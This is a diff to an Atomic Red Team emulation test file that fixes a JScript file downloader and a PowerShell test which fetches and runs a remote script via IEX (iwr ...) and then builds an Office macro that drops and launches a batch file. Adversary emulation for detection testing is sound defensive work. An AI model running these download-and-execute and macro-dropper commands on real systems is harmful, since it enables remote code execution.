@@ -60,7 +60,7 @@ atomic_tests:
       default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
   executor:
     command: |
-      echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+      echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
       cscript //E:Jscript #{script_file}
     cleanup_command: |
       del #{script_file} /F /Q >nul 2>&1
@@ -165,8 +165,11 @@ atomic_tests:
     command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
-      $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $bat_path `", vbNormalFocus)`n"
+      $macrocode = "   Open `"#{bat_path}`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c #{bat_path} `", vbNormalFocus)`n"
       Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
+    cleanup_command: |
+      Remove-Item #{bat_path} -ErrorAction Ignore
+      Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
     name: powershell
 - name: Excel 4 Macro
   auto_generated_guid: 4ea1fc97-8a46-4b4e-ba48-af43d2a98052
